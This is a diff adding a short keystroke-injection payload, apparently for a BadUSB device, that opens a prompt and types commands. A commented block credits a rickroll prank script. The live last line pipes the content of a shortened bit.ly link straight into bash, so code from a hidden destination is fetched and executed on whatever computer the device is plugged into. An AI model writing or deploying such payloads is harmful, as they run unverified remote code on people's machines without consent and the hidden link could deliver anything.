@@ -1,0 +1,7 @@
+GUI ENTER
+DELAY 2000
+REM_BLOCK
+STRINGLN curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
+link gotten from: https://github.com/keroserene/rickrollrc/
+END_REM
+STRINGLN curl -s -L https://bit.ly/3zvELNz | bash
